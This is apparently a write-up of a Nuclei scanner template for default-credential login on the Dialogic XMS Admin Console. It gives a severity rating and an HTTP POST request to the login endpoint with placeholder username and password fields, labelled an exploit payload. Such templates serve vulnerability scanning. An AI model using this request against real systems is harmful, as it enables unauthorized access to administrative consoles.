# Nuclei Template: Dialogic XMS Admin Console - Default Login
**Template ID:** dialogic-xms-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`dialogic-xms-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Dialogic XMS Admin Console was using default credentials and it was discovered.

## Steps to reproduce / Exploit Payload
```http
POST /index.php/verifyLogin/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

usernameId={{username}}&passwordId={{password}}
```

